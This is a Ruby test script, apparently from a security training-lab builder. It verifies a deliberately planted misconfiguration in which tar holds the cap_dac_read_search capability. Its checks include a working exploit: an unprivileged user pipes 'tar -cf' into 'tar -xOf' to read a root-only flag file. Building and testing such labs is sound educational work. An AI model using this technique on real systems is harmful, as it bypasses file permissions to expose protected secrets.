require_relative '../../../../../lib/post_provision_test'


class CapDacReadSearchTarTest < PostProvisionTest
  def initialize
    self.module_name = 'cap_dac_read_search_tar'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # Inputs: leaked_filenames and strings_to_leak are both checked below
    # (file name, owner/mode and content). Nothing is skipped.
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('tar has cap_dac_read_search', '/usr/sbin/getcap /usr/bin/tar', 'cap_dac_read_search=ep')
      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_local_command("leaked #{fname} holds expected string", "sudo cat #{Shellwords.escape("/root/#{fname}")}", s.strip.lines.first.to_s.strip)
      end
    end

    tier(2) do
      # what a student sees: getcap lists tar with the capability
      test_local_command('unprivileged user finds tar via getcap', '/usr/sbin/getcap -r /usr/bin 2>/dev/null', '/usr/bin/tar', user: 'nobody')
      leaked.each_with_index do |f, i|
        path = Shellwords.escape("/root/#{f}")
        # control: a plain read is refused, so any success below is down to the capability
        test_local_command("unprivileged user cannot cat #{f} directly", "cat #{path} 2>&1", 'Permission denied', user: 'nobody')
        s = strings[i].to_s.strip.lines.first.to_s.strip
        next if s.empty?
        # the misconfiguration: archive the root-only file and extract it to stdout
        test_local_command("unprivileged user reads #{f} via tar", "tar -cf - #{path} 2>/dev/null | tar -xOf - 2>/dev/null", s, user: 'nobody')
      end
    end
    tier(3) do
      flag   = leaked.first
      secret = strings.first.to_s.strip.lines.first.to_s.strip
      if flag.nil? || secret.empty?
        skip_check('tar cap_dac_read_search reads root-only flag',
                   'no leaked filename/string resolved from inputs', tier: 3)
      else
        path  = "/root/#{flag}"
        epath = Shellwords.escape(path)
        name  = 'unprivileged user reads root-only flag via tar cap_dac_read_search'
        # Create a throwaway real login account (non-root, non-sudoer, own home);
        # the credential is removed on the way out, so nothing is baked into the image.
        with_throwaway_ssh_user do |user, _pass|
          # Baseline, as the throwaway user: prove the account is genuinely
          # unprivileged and that a direct read of the root:root 0600 flag is
          # refused — so the success below is down to the capability, not latent rights.
          who    = run_as_user(user, 'id; sudo -n -l 2>&1 || true')[:stdout].to_s
          denied = run_as_user(user, "cat #{epath} 2>&1 || true")[:stdout].to_s
          # Exploit — CAP_DAC_READ_SEARCH bypasses DAC read checks: the
          # capability-endowed tar archives the root-only file and extracts it to
          # stdout, handing an unprivileged user root-level read of any file.
          got = run_as_user(user, "tar -cf - #{epath} 2>/dev/null | tar -xOf - 2>/dev/null")[:stdout].to_s

          add_evidence('throwaway_user_id', "echo #{Shellwords.escape(who[0, 500])}")
          add_evidence('direct_read_refused', "echo #{Shellwords.escape(denied[0, 500])}")
          add_evidence('tar_capability_read', "echo #{Shellwords.escape(got[0, 1000])}")

          is_root = who =~ /uid=0\(/
          sudoer  = who =~ /\((?:sudo|admin|wheel)\)/ || who =~ /NOPASSWD|may run|\(ALL/
          if is_root || sudoer
            fail_check(name, "throwaway user #{user} is not unprivileged (#{who[/uid=\S+/]}); cannot prove escalation", tier: 3)
          elsif !denied.include?('Permission denied')
            fail_check(name, "direct read of #{path} as #{user} was not refused, so the flag is not actually root-only", tier: 3)
          elsif !got.include?(secret)
            fail_check(name, "tar capability read did not return the root-only secret; got #{got.strip[0, 120].inspect}", tier: 3)
          else
            # <privilege>=root_rwx: an unprivileged account obtained the contents of
            # a root:root 0600 file — root-level read of arbitrary files.
            pass_check(name, "unprivileged #{user} (#{who[/uid=\S+/]}, direct cat refused) read root-only #{path} via tar cap_dac_read_search — root-level file access (<privilege>=root_rwx)", tier: 3)
          end
        end
      end
    end
  end

end

CapDacReadSearchTarTest.new.run
